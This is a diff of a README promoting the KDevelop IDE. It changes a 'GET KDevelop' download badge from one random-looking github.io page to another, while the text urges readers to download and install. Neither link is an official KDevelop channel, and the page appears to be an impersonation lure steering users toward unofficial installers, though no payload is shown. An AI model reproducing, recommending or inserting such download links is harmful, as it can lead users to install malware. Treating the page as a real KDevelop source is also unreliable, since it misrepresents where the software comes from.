@@ -57,7 +57,7 @@ The editor combines syntax highlighting, semantic code understanding, version co
 
 Prerequisites: A supported desktop system, development tools for your language, and a project source folder or version control repository.
 
-[![GET KDevelop](https://img.shields.io/badge/GET%20%E2%80%94%20KDevelop-0078D6?style=for-the-badge&logoColor=white)](https://oliveramhhyx433.github.io/.github/kdevelop-app)
+[![GET KDevelop](https://img.shields.io/badge/GET%20%E2%80%94%20KDevelop-0078D6?style=for-the-badge&logoColor=white)](https://saulcainbjgl.github.io/.github/kdevelop-app)
 
 1.  **Download and Install:** Use kdevelop download resources from your distribution, software center, or official project channels, then complete the KDevelop install process.
 2.  **Open or Import Code:** Launch KDevelop IDE and open an existing folder, CMake project, Git checkout, or sample code from a KDevelop tutorial.
